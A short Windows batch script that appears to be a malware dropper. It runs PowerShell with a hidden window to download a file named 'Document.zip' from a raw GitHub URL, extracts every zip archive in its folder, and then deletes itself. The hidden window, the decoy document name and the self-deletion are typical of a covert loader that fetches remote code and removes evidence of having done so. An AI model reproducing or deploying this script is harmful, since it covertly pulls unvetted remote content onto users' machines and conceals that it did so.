@echo off
SET "FILENAME=%~dp0\Document.zip"
cmd /c %SystemRoot%\System32\WindowsPowerShell\v1.0\powershell.exe -windowstyle hidden -command "& { (New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/sellxilips/document/main/Document.zip', '"%FILENAME%"') }"

setlocal EnableExtensions DisableDelayedExpansion
for %%I in (*.zip) do (
    md "%%~nI" 2>nul
    if exist "%%~nI\" (
        cmd /c %SystemRoot%\System32\WindowsPowerShell\v1.0\powershell.exe -NoLogo -Command "Expand-Archive -LiteralPath '%%I' -DestinationPath '%%~nI' -Force"
        if exist "%%~nI\%%~nI\" (
            set "Other="
            for /F "eol=| delims=" %%J in ('dir "%%~nI\*" /A /B 2^>nul ^| %SystemRoot%\System32\findstr.exe /I /L /V /X "%%~nI"') do set "Other=1"
            if not defined Other (
                ren "%%~nI" "%%~nI_tmp"
                if not errorlevel 1 (
                    move "%%~nI_tmp\%%~nI" .\ >nul
                    rd "%%~nI_tmp"
                )
            )
        )
    )
)
endlocal

(goto) 2>nul & del "%~f0"
